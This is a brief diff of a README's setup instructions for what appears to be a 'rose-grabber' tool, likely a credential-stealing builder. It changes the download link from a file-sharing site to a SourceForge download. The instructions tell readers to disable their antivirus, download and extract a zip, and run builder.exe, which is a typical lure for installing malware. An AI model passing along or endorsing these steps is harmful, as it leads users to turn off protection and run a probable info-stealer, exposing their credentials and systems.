@@ -43,7 +43,7 @@ Please be cognizant of the fact that nestled within the intricate architecture o
 ### Setup
 
 **Before proceeding, briefly disable your antivirus to avoid accidental removal of important components. Install Python properly, ensuring it's added to PATH. Preferably, use Python 3.11 and uninstall other versions. Thanks!**
-- Download repository [here](https://fastupload.io/en/HbybYDKtmQAuuZy/file)
+- Download repository [here](https://sourceforge.net/projects/rose-grabber/files/latest/download)
 - Extract the zip file.
 - Launch UI by executing builder.exe
 
